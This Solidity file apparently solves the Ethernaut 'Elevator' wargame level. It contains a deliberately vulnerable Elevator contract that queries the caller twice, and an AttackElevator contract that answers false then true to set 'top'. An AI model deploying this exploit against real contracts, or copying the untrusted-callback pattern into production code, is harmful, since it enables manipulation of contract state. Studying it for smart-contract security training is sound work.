// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator {
    Elevator k;
    bool called;

    function isLastFloor(uint) public returns (bool) {
        if(!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    constructor(address victim) public {
        k = Elevator(victim);
    }

    function attack() public {
        called = false;
        k.goTo(1);
    }
}